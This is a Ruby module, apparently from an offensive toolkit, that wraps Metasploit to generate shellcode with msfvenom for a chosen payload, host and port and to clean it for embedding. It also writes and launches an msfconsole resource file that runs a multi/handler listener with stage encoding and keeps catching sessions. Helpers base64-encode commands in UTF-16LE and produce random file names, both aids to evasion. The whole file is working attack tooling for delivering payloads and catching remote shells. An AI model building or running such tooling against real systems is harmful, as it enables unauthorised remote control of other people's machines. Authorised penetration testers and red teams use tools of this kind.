#!/usr/bin/env ruby
require 'core'
require 'base64'
include Core::Commands

module Msf
  def encode_command(command)
    Base64.encode64(command.encode('utf-16le')).delete("\r\n")
  end

  def random_name_gen
    random_length = rand(4..8)
    file_name = random_length.to_i.times.map do
      [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
    end.join
    file_name
  end

  def hex_to_bin(file_name, hex_string)
    File.open(file_name, 'w') do |f|
      # f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))
      f.write(hex_string.scan(/../).map(&:hex))
    end
  end

  def bin_to_hex(file)
    bin_file = File.open(file, 'rb').read
    bin_file.unpack('H*').first
  end

  class MsfCommands
    include Core::Files
    def initialize
      if File.exist?('/usr/bin/msfvenom')
        @msf_path = '/usr/bin/'
      elsif File.exist?('/opt/metasploit-framework/msfvenom')
        @msf_path = ('/opt/metasploit-framework/')
      else
        print_error('Metasploit Not Found!')
        exit
      end
    end

    def generate_shellcode(host, port, payload)
      @set_payload = payload
      print_info('Generating shellcode')
      cmd = "#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} "
      cmd << "LPORT=#{port} -f C"
      execute  = `#{cmd}`
      print_success('Shellcode Generated')
      clean_shellcode(execute)
    end

    def start(host, port)
      unless Dir.exist?(file_root + '/metaspoit_files/')
        Dir.mkdir(file_root + '/metaspoit_files/')
      end
      file_path = file_root + '/metaspoit_files/'
      rc_file = 'msf_listener.rc'
      write_rc(file_path, rc_file, host, port)
      print_info("Setting up Metasploit this may take a moment\n")
      system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
    end

    private

    def clean_shellcode(shellcode)
      shellcode = shellcode.gsub('\\', ',0')
      shellcode = shellcode.delete('+')
      shellcode = shellcode.delete('"')
      shellcode = shellcode.delete("\n")
      shellcode = shellcode.delete("\s")
      shellcode[0..4] = ''
      shellcode
    end

    def write_rc(file_path, rc_file, host, port)
      file = File.open("#{file_path}#{rc_file}", 'w')
      file.write("use exploit/multi/handler\n")
      file.write("set PAYLOAD #{@set_payload}\n")
      file.write("set LHOST #{host}\n")
      file.write("set LPORT #{port}\n")
      file.write("set EnableStageEncoding true\n")
      file.write("set ExitOnSession false\n")
      file.write('exploit -j')
      file.close
    end
  end
end
